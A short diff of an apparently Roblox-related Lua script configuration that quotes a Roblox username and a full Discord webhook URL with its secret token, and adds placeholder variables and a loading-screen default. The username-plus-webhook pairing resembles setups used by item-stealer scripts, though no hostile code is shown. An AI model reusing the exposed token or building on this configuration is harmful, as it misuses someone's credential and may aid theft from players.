@@ -1,5 +1,8 @@
-Roblox_Username = MargarinePool
-Discord_Webhook = https://discord.com/api/webhooks/1295120133752099010/yDSw9Ik-wMf8Elm1DJgXIuFPulaEEWEn55Ne0Hhvyy7EDA6YBRpwVr8jNfewzxeZERLW
+Roblox_Username = "MargarinePool"
+Discord_Webhook = "https://discord.com/api/webhooks/1295120133752099010/yDSw9Ik-wMf8Elm1DJgXIuFPulaEEWEn55Ne0Hhvyy7EDA6YBRpwVr8jNfewzxeZERLW"
+
+Username = "Username"  -- To zostanie zignorowane
+Webhook = "Webhook"
 
 if selectedLoadingScreen == nil or selectedLoadingScreen == "" then
     selectedLoadingScreen = "1"
